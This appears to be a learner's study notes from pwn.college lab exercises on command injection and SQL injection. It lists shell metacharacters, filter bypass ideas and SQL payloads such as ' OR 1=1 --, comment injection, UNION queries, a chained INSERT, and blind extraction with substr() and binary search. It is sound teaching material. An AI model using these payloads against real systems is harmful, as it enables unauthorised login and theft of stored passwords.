____Command Injection____
User input reaches the operating system shell.
Shell metacharacters (;, &&, ||, |, $(), backticks) let attackers alter execution.
URL encoding can bypass simple input filters.
Blind command injection relies on side effects (like delays) instead of visible output.

_______SQL Injection______
User input changes the structure of an SQL query.
-- comments out the remainder of a query.
OR 1=1 can bypass poorly written authentication.
LIKE, %, and _ enable pattern matching.
substr() and length() are powerful for blind SQL injection.
Binary search dramatically reduces the number of requests needed for blind extraction.
Understanding SQL operator precedence (AND before OR) is essential for crafting correct payloads.


automation:
Used requests.Session() to maintain cookies.
Sent SQL injection payloads automatically.
Used LIKE to verify known prefixes.
Used length(password) to determine the flag length.
Used substr(password, pos, 1) with ASCII comparisons to binary-search each character, reducing each character guess to roughly 7 requests.
Gradually reconstructed the full pwn.college{...} flag.


-- Basic Login Query
SELECT *
FROM users
WHERE username = '$username'
AND password = '$password';

-- Comment Injection
admin' --

-- Authentication Bypass
' OR 1=1 --

-- LIKE (Pattern Matching)
password LIKE 'pwn.college{%'
password LIKE 'abc%'
password LIKE '%xyz'
password LIKE '%middle%'
LIKE 'admin%'
LIKE 'a___'

-- Finding Password Length
length(password)
length(password)=60
length(password)>50

-- Extracting Characters
substr(password,13,1)
substr(password,1,1)
substr(password,15,1)
substr(password, position, 1)

-- Character Comparisons (Binary Search)
substr(password,13,1) > 'm'
substr(password,13,1) < 'm'
substr(password,13,1) = 'm'
substr(password,20,1) > 'g'

-- Prefix Testing
password LIKE 'pwn.college{a%'
password LIKE 'pwn.college{ab%'
password LIKE 'pwn.college{abc%'

-- UNION
SELECT username
FROM users
UNION
SELECT password
FROM users;

-- Chained Queries
SELECT * FROM users;
INSERT INTO users VALUES('hacker','pass');

